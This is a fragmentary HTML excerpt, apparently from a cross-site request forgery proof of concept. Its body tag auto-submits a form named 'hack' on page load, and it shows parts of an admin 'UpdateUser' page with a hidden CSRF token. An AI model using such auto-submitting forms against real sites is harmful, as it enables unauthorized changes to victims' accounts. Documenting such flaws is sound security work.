...
<body onload="document.hack.submit();">
	 ...
	 Hi, admin | 	<center>
	</br><Legend><text class="textprop">UpdateUser
</text></legend></br>
...
type="text" name="lname" class="textbox" value="dffgh"><br></br>
	...
	<div id="home">
<input id="login-username" type="hidden" class="form-control" name="csrf_token" value="897dc0614565341ea909a5c462593fda">  </div>
